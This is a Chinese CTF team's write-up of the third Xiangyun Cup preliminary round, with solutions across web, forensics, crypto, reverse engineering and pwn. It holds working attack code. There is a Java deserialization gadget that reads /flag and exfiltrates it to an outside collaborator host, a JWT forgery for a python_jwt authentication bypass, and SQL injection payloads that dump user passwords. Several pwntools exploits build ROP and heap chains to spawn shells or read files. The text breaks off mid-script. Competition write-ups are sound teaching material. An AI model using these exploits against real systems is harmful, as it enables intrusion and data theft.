# 第三届“祥云杯”CTF初赛WriteUp By EDISEC

> 原文: https://www.ctfiot.com/68739.html
> ID: 68739

秀米社团

JOIN US ▶▶▶

招新

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn misc方向的师傅）有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。

点击蓝字 ·  关注我们

01

Web

1

ezjava

cc链 反弹shell curl wget都不行 读flag发送下

package com.ctf.ezjava;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import javassist.*;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.util.PriorityQueue;
public class cc4 { public static void main(String[] args) throws Exception {
 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass("Cat"); String cmd = "String flag = "";n" + " String str;n" + " java.io.BufferedReader in = new java.io.BufferedReader(new java.io.FileReader("/flag"));n" + " while ((str = in.readLine()) != null) {n" + " flag += str;n" + " }"; cmd += "flag = flag.replace("{","");" + "flag = flag.replace("}","");"; cmd += "java.net.URL url = new java.net.URL("http://"+flag+".xgh92aja87fsginch3ss2fnklbr7fw.oastify.com/");n" + "java.net.HttpURLConnection con = (java.net.HttpURLConnection) url.openConnection();n" + "con.setRequestMethod("GET");n" + "n" + " //添加请求头n" + " con.setRequestProperty("User-Agent", "feng");n" + " int responseCode = con.getResponseCode();"+ ""; // 创建 static 代码块，并插入代码 cc.makeClassInitializer().insertBefore(cmd); String randomClassName = "EvilCat" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错 // 写入.class 文件 byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, "_bytecodes", targetByteCodes); // 进入 defineTransletClasses() 方法需要的条件 setFieldValue(templates, "_name", "name"); setFieldValue(templates, "_class", null);
 /** * TrAXFilter 构造函数能直接触发 所以不用利用 invoke 那个 */ ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates}) });
 TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(2,comparator);
 Field size = Class.forName("java.util.PriorityQueue").getDeclaredField("size"); size.setAccessible(true); size.set(queue,2);
 Field comparator_field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator"); comparator_field.setAccessible(true); comparator_field.set(queue,comparator);
 try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc4")); outputStream.writeObject(queue); outputStream.close();
 ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc4")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } }
 public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); }
 public static Field getField(final Class<?> clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; }}

dns 请求获得flag

2

FunWEB

python_jwt cve 绕过认证

# import python_jwt as jwt, jwcrypto.jwk as jwk, datetimeimport python_jwt as jwtimport jwcrypto.jwk as jwk, datetimefrom json import loads, dumpsfrom jwcrypto.common import base64url_decode, base64url_encodekey = jwk.JWK.generate(kty='RSA', size=2048)payload = { 'foo': 'bar', 'wup': 90 ,'sub': 'alice'}old_payload = { 'foo': 'bar', 'wup': 90 ,'sub': 'alice'}token = jwt.generate_jwt(payload, key, 'PS256', datetime.timedelta(minutes=5))token = "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcwNjA4MzUsImlhdCI6MTY2NzA2MDUzNSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiIzTENMV3pyR01NQTA0cS1ZWHlscnhRIiwibmJmIjoxNjY3MDYwNTM1LCJwYXNzd29yZCI6IjEiLCJ1c2VybmFtZSI6IjEifQ.ZPqmuKsrszmRoLtB2_5uIFoyZO-OoaLPuDbjOg9dX-so5hUAEkRFhRhBruE5x1E1mxiNwUGMfFanFEzrvA2IMXHmtRomg2cJANVWzBCIpxglElDFd3bKN-AONUqtICupDYC1sDMwLIm3COEMgl03kaWCcUqYOqO5GtAzGNguJLDO0iEoPgWid1FNvqZvdSa0ji7AnypnFiBJDn5thjATzwWhgj6UsLtMkhEOLRJnLPJimwb1CfZivcrT1yPgucFLXw5Dh4T9bk3cfre85JSW5jT9_2MIIwUZHtoJj1onU1b7I4u8iJ2zUC7WFvpkDCofMrRHyTU_XfLeOrePxACe6w"[header, payload, signature] = token.split('.')parsed_payload = loads(base64url_decode(payload))parsed_payload['is_admin'] = 1parsed_payload['exp'] = 2000000000fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))token = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'print(token)header, claims = jwt.verify_jwt(token, key, ['PS256'])print(claims)print(old_payload)for k in payload: assert claims[k] == old_payload[k]

成功后 getflag提示需要管理员密码才能获得flag

获取所有类型 找到可以输⼊字符串的查询

query={ __schema { types { name } }}

判断出sql注入 然后发现是sqlite 找表找字段query={ getscoreusingnamehahaha(name: "admin' and 1 --+"){ name score userid } }query={ getscoreusingnamehahaha(name: "a' union select sqlite_version() --+"){ name score userid } }query={ getscoreusingnamehahaha(name: "a' union select group_concat(name) from sqlite_master where type='table' --+"){ name score userid } }query={ getscoreusingnamehahaha(name: "a' union select group_concat(sql) from sqlite_master where type='table' and name='users'--+"){ name score userid } }query={ getscoreusingnamehahaha(name: "a' union select group_concat(password) from users --+"){ name score userid } }

POST /graphql HTTP/1.1Host: eci-2ze0xya70kbnpg3q73ta.cloudeci1.ichunqiu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 118Origin: http://eci-2ze0xya70kbnpg3q73ta.cloudeci1.ichunqiu.comConnection: closeReferer: http://eci-2ze0xya70kbnpg3q73ta.cloudeci1.ichunqiu.com/Cookie: token={" eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwMDAwMDAwMDAsImlhdCI6MTY2NzA2MDUzNSwiaXNfYWRtaW4iOjEsImlzX2xvZ2luIjoxLCJqdGkiOiIzTENMV3pyR01NQTA0cS1ZWHlscnhRIiwibmJmIjoxNjY3MDYwNTM1LCJwYXNzd29yZCI6IjEiLCJ1c2VybmFtZSI6IjEifQ.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE2NjcwNjA4MzUsImlhdCI6MTY2NzA2MDUzNSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiIzTENMV3pyR01NQTA0cS1ZWHlscnhRIiwibmJmIjoxNjY3MDYwNTM1LCJwYXNzd29yZCI6IjEiLCJ1c2VybmFtZSI6IjEifQ","signature":"ZPqmuKsrszmRoLtB2_5uIFoyZO-OoaLPuDbjOg9dX-so5hUAEkRFhRhBruE5x1E1mxiNwUGMfFanFEzrvA2IMXHmtRomg2cJANVWzBCIpxglElDFd3bKN-AONUqtICupDYC1sDMwLIm3COEMgl03kaWCcUqYOqO5GtAzGNguJLDO0iEoPgWid1FNvqZvdSa0ji7AnypnFiBJDn5thjATzwWhgj6UsLtMkhEOLRJnLPJimwb1CfZivcrT1yPgucFLXw5Dh4T9bk3cfre85JSW5jT9_2MIIwUZHtoJj1onU1b7I4u8iJ2zUC7WFvpkDCofMrRHyTU_XfLeOrePxACe6w"}X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1query={ getscoreusingnamehahaha(name: "a' union select group_concat(password) from users --+"){ name score userid  } }# jlrSgkm4lHk1Ya43CaAQ

3

Rustwaf

02

Misc

1

strange_forensics

python3 volatility3/vol.py -f 1.mem banners.Bannersrogress: 100.00 PDB scanning finished Offset  Banner0x3e6001a0 Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 (Ubuntu 5.4.0-84.94~18.04.1-generic 5.4.133)0x3f191d94 Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 (Ubuntu 5.4.0-84.94~18.04.1-generic 5.4.133)0x710b7c88 Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 (Ubuntu 5.4.0-84.94~18.04.1-generic 5.4.133)0x7bd00010 Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 (Ubuntu 5.4.0-84.94~18.04.1-generic 5.4.133)

跑出内核版本，制作profile文件，参照如下

https://mp.weixin.qq.com/s/dbHGBzjcMoF8aPqIkCN_FgLinux · volatilityfoundation/volatility Wiki (github.com)

$ git clone https://github.com/volatilityfoundation/dwarf2json$ cd dwarf2json/$ go buildwget <https://launchpad.net/ubuntu/+archive/primary/+files/linux-image-unsigned-5.4.0-84-generic-dbgsym_5.4.0-84.94_amd64.ddeb>git clone https://github.com/volatilityfoundation/volatility3.git# 使用能适用该内核的操作系统 (ubuntu 18.04 / 20.04 / etc)$ docker run -it --rm -v $PWD:/volatility ubuntu:18.04 /bin/bash/# cd /volatility//volatility# dpkg -i linux-image-unsigned-5.4.0-84-generic-dbgsym_5.4.0-84.94_amd64.ddeb/volatility# dpkg -i linux-image-unsigned-5.4.0-84-generic-dbgsym_5.4.0-84.94_amd64.ddeb/volatility# ./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-5.4.0-84-generic > linux-image-5.4.0-84.94-generic.json $ cp linux-image-5.4.0-84.94-generic.json ./volatility3/volatility3/framework/symbols/linux

# 建立模拟环境cd ./volatility2/tools/linuxdocker run -it —rm -v $PWD:/volatility ubuntu:20.04 /bin/bash# 安装必须环境apt updateapt install -y linux-headers-5.4.0-84-generic linux-image-5.4.0-84-generic dwarfdump build-essential vim zipcd /volatility/tools/linux/volatility/tools/linux# make/volatility/tools/linux# cd //volatility/tools/linux# zip Linux-5.4.0-84-generic.zip volatility/tools/linux/module.dwarf /boot/System.map-5.4.0-84-generic/volatility/tools/linux# exitmv Linux-5.4.0-84-generic.zip ./volatility2/volatility/plugins/overlays/linux

sudo volatility -f 1.mem --profile=LinuxUbuntu180484x64 linux_recover_filesystem -D filesystem

正解应该是分析桌面的app.py，去跑键盘监听的数据，这里我们也做出来了。

参考

CyberDefenders Write-up: CTF01. This is going to be my write-up for the… | by Nisarg Suthar | Medium

(TimeStamp_INT, 0 [Reserved], TimeStamp_DEC, 0 [Reserved], type, code [key pressed], value [press/release])

CTFtime.org / HSCTF 7 / Developer Input / Writeup

03

Crypto

1

little little fermat

from Crypto.Util.number import *def get_pl(): pl=[] for i in range(100,512): for j in range(10,512//4): for k in range(2,6):                pl.append((i+j)//k) pl=list(set(pl))    return plpl=get_pl()n = 141321067325716426375483506915224930097246865960474155069040176356860707435540270911081589751471783519639996589589495877214497196498978453005154272785048418715013714419926299248566038773669282170912502161620702945933984680880287757862837880474184004082619880793733517191297469980246315623924571332042031367393c = 81368762831358980348757303940178994718818656679774450300533215016117959412236853310026456227434535301960147956843664862777300751319650636299943068620007067063945453310992828498083556205352025638600643137849563080996797888503027153527315524658003251767187427382796451974118362546507788854349086917112114926883e = 65537def get_P(pl,n): for i in pl: for j in pl: t=(1<<i)+(1<<j) t=t**2+4*n r=gmpy2.iroot(t,2) if r[1]: delta_s=r[0] A=-((1<<i)+(1<<j)) p=(-A+delta_s)//2 assert n%p==0                return pp=get_P(pl,n)q=n//pd=inverse(e,(p-1)*(q-1))m=pow(c,d,n)print(long_to_bytes(m^((p-1)**2)))

2

DLP

from Crypto.Util.number import *from pwn import *import gmpy2context.log_level = 'debug'p = 2 ** 1024 - 2 ** 234 - 2 ** 267 - 2 ** 291 - 2 ** 403 - 1def get_root(x,p): # g^x==4 mod p gg,a,b=gmpy2.gcdext(x,p-1) if gg==2: t=pow(4,a,p) g=pow(t,(p+1)//4,p) return g elif gg==1:        return pow(4,a,p)s='1'r=remote('47.95.3.91', 42259)while True: r.sendline('t') g=get_root(int(s,2),p) r.sendline(str(g)) r.recvuntil(' desired integer: n') tr=r.recvline() if b'flag' in tr: print(tr) break tt,rr=eval(tr[8:]) if tt==1: s=s+'1' else: if s[-1]=='1': s=s[:-1]+'0'    print(s)r.interactive()

3

fill

import hashlibnbits = 32S=492226042629702n = 991125622s=[562734112,859151551,741682801]M = [19621141192340, 39617541681643, 3004946591889, 6231471734951, 3703341368174, 48859912097514, 4386411556216, 11028070476391, 18637548953150, 29985057892414, 20689980879644, 20060557946852, 46908191806199, 8849137870273, 28637782510640, 35930273563752, 20695924342882, 36660291028583, 10923264012354, 29810154308143, 4444597606142, 31802472725414, 23368528779283, 15179021971456, 34642073901253, 44824809996134, 31243873675161, 27159321498211, 2220647072602, 20255746235462, 24667528459211, 46916059974372]m=(s[2]-s[1])*inverse_mod(s[1]-s[0],n)%nc=(s[1]-s[0]*m)%nseed=s[0]s = [0] * nbitss[0]=seedfor i in range(1, nbits):    s[i] = (s[i-1]*m+c)%nfor t in range(nbits):    M[t] = M[t] - s[t]m=matrix(ZZ,nbits+1,nbits+1)for i in range(nbits): m[i,i]=1    m[i,nbits]=M[i]m[nbits,nbits]=-Sr=m.LLL()tmp_m=[str(i) for i in r[-1]]       tmp_m=''.join(tmp_m[:-1])msg=int(tmp_m,2)flag = f'flag{{{hashlib.sha256(str(msg).encode()).hexdigest()}}}'print(flag)

4

tracing

from Crypto.Util.number import *n=113793513490894881175568252406666081108916791207947545198428641792768110581083359318482355485724476407204679171578376741972958506284872470096498674038813765700336353715590069074081309886710425934960057225969468061891326946398492194812594219890553185043390915509200930203655022420444027841986189782168065174301c=64885875317556090558238994066256805052213864161514435285748891561779867972960805879348109302233463726130814478875296026610171472811894585459078460333131491392347346367422276701128380739598873156279173639691126814411752657279838804780550186863637510445720206103962994087507407296814662270605713097055799853102e = 65537with open(r'C:UsersAdministratorDesktoptrace.out','r') as f:    l=f.readlines()ll=[]for i in l: if 'a = rshift1(a)' in i or 'a, b = b, a' in i or 'a = a - b' in i or 'b = rshift1(b)' in i:        ll.append(i.strip())ll=ll[::-1]a=1b=0for i in ll: if 'a, b = b, a' in i: a, b = b, a if 'a = rshift1(a)' in i: a=a<<1 if 'b = rshift1(b)' in i: b=b<<1 if 'a = a - b' in i:        a = a + bphi,e=a,bd=inverse(e,phi)print(long_to_bytes(pow(c,d,n)))

04

Re

1

engtom

https://github.com/jerryscript-project/jerryscript/blob/c5bc3786cfd4ad2e9217e358227854c5a160e49a/docs/01.CONFIGURATION.md

python tools/build.py --show-opcodes=ON --snapshot-exec=ON编译时候开启选项./jerry --show-opcodes --exec-snapshot chall.snapshot查看字节码

分析字节码发现加密方式和数据

ans=[1605062385,-642825121,2061445208,1405610911,1713399267,1396669315,1081797168,605181189,1824766525,1196148725,763423307,1125925868]for i in ans:print(hex(i&0xffffffff)[2:],end=',')print()#5fab4ef1d9af445f7adf285853c7eb9f662065e3533f7b83407aea30241255056cc3ba3d474bc7f52d80ea4b431c43ec

key=[19088743,2309737967,4275878552,1985229328]for i in key:print(hex(i&0xffffffff)[2:],end=',')print()#0123456789abcdeffedcba9876543210

使用SM4解密就行

05

Pwn

1

protocol

#coding:utf-8from pwn import *from ctypes import CDLLimport varintcontext.log_level='debug'elfelf='./protocol'elf=ELF(elfelf)context.arch=elf.archgdb_text='''  '''if len(sys.argv)==1 : io=process(elfelf) gdb_open=1 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so')  one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]elif sys.argv[1]=='2' : io=process(elfelf) gdb_open=0 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so')  one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]else : io=remote('101.201.71.136',28565) gdb_open=0 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so')  one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]def gdb_attach(io,a): if gdb_open==1 :    gdb.attach(io,a)def Key(Id, Type):    return varint.encode((Id<<3) | Type)def value_str(cont):    return varint.encode(len(cont))+contdef PacketInt(n):    return varint.encode(n)def Login(name, pwd): io.recvuntil('Login: ') pay = '' pay+= Key(1, 2)+value_str(name) pay+= Key(2, 2)+value_str(pwd)    io.send(pay)# stack overflowdef edit_plus(a,b): len1=len(b) print b for i in range(len1): if b[len1-1-i:len1-i]=='x00': idx=b.find('x00',len1-i,len1) if idx != -1 : note='a'*(len1-i)+b[len1-i:idx]        Login(a,note) else: note='a'*(len1-i)+b[len1-i:]        Login(a,note) note='a'*(len1-i-1)      Login(a,note) if i == len1-1: idx=b.find('x00',0,len1) if idx == -1 : Login(a,b) else :        Login(a,b[:idx])pay = 'admin'+cyclic(579)pay+= p64(0x0000000000588bbe) # pop rsi ; retpay+= p64(0x0000000000817b80) # @ .datapay+= p64(0x00000000005bdb8a) # pop rax ; retpay+= '/bin//sh'pay+= p64(0x00000000005b6835) # mov qword ptr [rsi], rax ; retpay+= p64(0x0000000000588bbe) # pop rsi ; retpay+= p64(0x0000000000817b88) # @ .data + 8pay+= p64(0x00000000006c6a69) # xor rax, rax ; retpay+= p64(0x00000000005b6835) # mov qword ptr [rsi], rax ; retpay+= p64(0x0000000000404982) # pop rdi ; retpay+= p64(0x0000000000817b80) # @ .datapay+= p64(0x0000000000588bbe) # pop rsi ; retpay+= p64(0x0000000000817b88) # @ .data + 8pay+= p64(0x000000000040454f) # pop rdx ; retpay+= p64(0x0000000000817b88) # @ .data + 8pay+= p64(0x00000000006c6a69) # xor rax, rax ; retpay+= p64(0x00000000005bdb8a)pay+= p64(0x3b)pay+= p64(0x0000000000403c99) # syscalledit_plus("admin",pay)edit_plus("admin","admin")# success('libc_base:'+hex(libc_base))# success('heap_base:'+hex(heap_base))gdb_attach(io,gdb_text)io.interactive()

2

unexploitable

#coding:utf-8import sysfrom pwn import *import randomfrom ctypes import CDLLcontext.log_level='debug'elfelf='./unexploitable'#context.arch='amd64'while True : try : elf=ELF(elfelf)    context.arch=elf.arch gdb_text=''' telescope $rebase(0x202040) 16      ''' if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so')      one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('47.95.3.91',38768) gdb_open=0 clibc.srand(clibc.time(0)) # libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so')      one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] def gdb_attach(io,a): if gdb_open==1 :        gdb.attach(io,a)    io.send('x00'*0x18+'xd1')    pay='x00'*0x18+p32(0x4f302+(random.randint(0,0xfff)<<12))[:3] io.send(pay) sleep(0.1) io.sendline('ls') if 'flag' in io.recv(timeout=0.2) : io.sendline('cat flag')      pause() else : io.close()      continue    io.interactive() except Exception as e: io.close() continue else: continue

3

bitheap

#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./bitheap'#context.arch='amd64'while True : # try : elf=ELF(elfelf)    context.arch=elf.arch gdb_text=''' telescope $rebase(0x202040) 16      ''' if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/glibc/x64/2.27/lib/libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so')      one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('39.106.13.71',18428) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('./libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so')      one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] def gdb_attach(io,a): if gdb_open==1 :        gdb.attach(io,a) def choice(a):      io.sendlineafter('Your choice: ',str(a)) def add(a,b): choice(1) io.sendlineafter('Index: ',str(a))      io.sendlineafter('Size: ',str(b))  def edit(a,b): choice(2) io.sendlineafter('Index: ',str(a))      io.sendafter('Content: ',b) def show(a): choice(3)      io.sendlineafter('Index: ',str(a)) def delete(a): choice(4)      io.sendlineafter('Index: ',str(a)) add(0,0xf8) add(1,0x68) add(2,0x88) add(3,0x68) add(4,0x88) add(5,0xf8) for i in range(7):      add(6+i,0xf8) for i in range(7):      delete(6+6-i) delete(0)    edit(4,'0'*0x80*8+'0'*8*1+'11000000'+'0'*8*6+'0') def code(a): m='' for i in range(64): if a%2==1: m+='1' else: m+='0'        a=a//2      return m delete(5) delete(3) delete(1) add(0,0x130)    show(0)    libc_base=u64(io.recvuntil('x7f')[-6:]+'x00x00')-libc.sym['__malloc_hook']-96-0x10-0x3f0 libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook'] pop_rdi_ret_addr=libc.search(asm('pop rdi;ret')).next() pop_rdx_rsi_ret_addr=libc.search(asm('pop rdx;pop rsi;ret')).next() pop_rax=libc.search(asm('pop rax;ret')).next()    syscall_ret=libc.search(asm('syscall;ret')).next() edit(0,'0'*0xf8*8+code(0x71)+code(free_hook_addr)) add(6,0xf8) add(7,0xf8) show(6) io.recvuntil('Content: ')    heap_base=u64(io.recv(6)+'x00x00')-0x100 pay=code(u64('./flagx00x00')) pay=pay.ljust(0x68*8,'0') #pading 0x68 pay+=code(3) #rdi rdi+0x68 pay+=code(0) #rsi rdi+0x70 pay+='0'*8*0x10 #pading 0x88 pay+=code(0) #rdx rdi+0x88 pay+='0'*8*0x10 #pading 0xa0 pay+=code(heap_base+0x100) #rsp rdi+0xa0 pay+=code(pop_rax) #rip rdi+0xa8 pay=pay.ljust(0x800,'0') pay+=code(10000) pay+=code(syscall_ret) pay+=code(pop_rdi_ret_addr) pay+=code(heap_base) pay+=code(pop_rdx_rsi_ret_addr) pay+=code(0) pay+=code(0) pay+=code(pop_rax) pay+=code(2) pay+=code(syscall_ret) pay+=code(pop_rdi_ret_addr) pay+=code(3) pay+=code(pop_rdx_rsi_ret_addr) pay+=code(0x100) pay+=code(heap_base+0x490) pay+=code(pop_rax) pay+=code(0) pay+=code(syscall_ret) pay+=code(pop_rdi_ret_addr) pay+=code(1) pay+=code(pop_rdx_rsi_ret_addr) pay+=code(0x100) pay+=code(heap_base+0x490) pay+=code(pop_rax) pay+=code(1)    pay+=code(syscall_ret) edit(6,pay[:0xf0*8])    edit(7,pay[0x100*8:]) add(1,0x68) add(3,0x68) edit(3,code(libc.sym['setcontext']+53))    delete(6) success('libc_base:'+hex(libc_base))    # success('heap_base:'+hex(heap_base)) gdb_attach(io,gdb_text)    io.interactive() # except Exception as e: # io.close() # continue # else: # continue

4

sandboxheap

#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./sandboxheap'#context.arch='amd64'while True : # try : elf=ELF(elfelf) context.arch=elf.arch
 gdb_text=''' telescope $rebase(0x202040) 16 '''
 if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/glibc/x64/2.27/lib/libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 else : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=remote('39.106.13.71',35272) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('./libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a)
 def choice(a): io.sendlineafter('Your choice:',str(a))
 def add(a,b): choice(1) io.sendlineafter('Index: ',str(a)) io.sendlineafter('Size: ',str(b)) def edit(a,b): choice(2) io.sendlineafter('Index: ',str(a)) io.sendafter('Content: ',b)
 def show(a): choice(3) io.sendlineafter('Index: ',str(a))
 def delete(a): choice(4) io.sendlineafter('Index: ',str(a))
 add(0,0xf8) add(1,0x68) add(2,0x88) add(3,0x68) add(4,0x88) add(5,0xf8) for i in range(7): add(6+i,0xf8)
 for i in range(7): delete(6+6-i)
 delete(0) edit(4,'0'*0x80*8+'0'*8*1+'11000000'+'0'*8*6+'0')
 def code(a): m='' for i in range(64): if a%2==1: m+='1' else: m+='0' a=a//2
 return m
 delete(5) delete(3) delete(1) add(0,0x130) show(0) libc_base=u64(io.recvuntil('x7f')[-6:]+'x00x00')-libc.sym['__malloc_hook']-96-0x10-0x3f0 libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook'] pop_rdi_ret_addr=libc.search(asm('pop rdi;ret')).next() pop_rdx_rsi_ret_addr=libc.search(asm('pop rdx;pop rsi;ret')).next() pop_rax=libc.search(asm('pop rax;ret')).next() syscall_ret=libc.search(asm('syscall;ret')).next()
 edit(0,'0'*0xf8*8+code(0x71)+code(free_hook_addr)) add(6,0xf8) add(7,0xf8) show(6) io.recvuntil('Content: ') heap_base=u64(io.recv(6)+'x00x00')-0x100
 pay=code(u64('./flagx00x00')) pay=pay.ljust(0x68*8,'0') #pading 0x68 pay+=code(3) #rdi rdi+0x68 pay+=code(0) #rsi rdi+0x70 pay+='0'*8*0x10 #pading 0x88 pay+=code(0) #rdx rdi+0x88 pay+='0'*8*0x10 #pading 0xa0 pay+=code(heap_base+0x100) #rsp rdi+0xa0 pay+=code(pop_rax) #rip rdi+0xa8 pay=pay.ljust(0x800,'0') pay+=code(10000) pay+=code(syscall_ret) pay+=code(pop_rdi_ret_addr) pay+=code(heap_base) pay+=code(pop_rdx_rsi_ret_addr) pay+=code(0) pay+=code(0) pay+=code(pop_rax) pay+=code(2) pay+=code(syscall_ret) pay+=code(pop_rdi_ret_addr) pay+=code(3) pay+=code(pop_rdx_rsi_ret_addr) pay+=code(0x100) pay+=code(heap_base+0x490) pay+=code(pop_rax) pay+=code(0) pay+=code(syscall_ret) pay+=code(pop_rdi_ret_addr) pay+=code(1) pay+=code(pop_rdx_rsi_ret_addr) pay+=code(0x100) pay+=code(heap_base+0x490) pay+=code(pop_rax) pay+=code(1) pay+=code(syscall_ret)
 edit(6,pay[:0xf0*8]) edit(7,pay[0x100*8:])
 add(1,0x68) add(3,0x68) edit(3,code(libc.sym['setcontext']+53)) delete(6) success('libc_base:'+hex(libc_base)) # success('heap_base:'+hex(heap_base))
 gdb_attach(io,gdb_text)    io.interactive() # except Exception as e: # io.close() # continue # else:  #   continue

5

leak

#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./leak'#context.arch='amd64'while True : # try : elf=ELF(elfelf) context.arch=elf.arch
 gdb_text=''' telescope $rebase(0x2143a0) 16 '''
 if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/glibc/x64/2.27/lib/libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
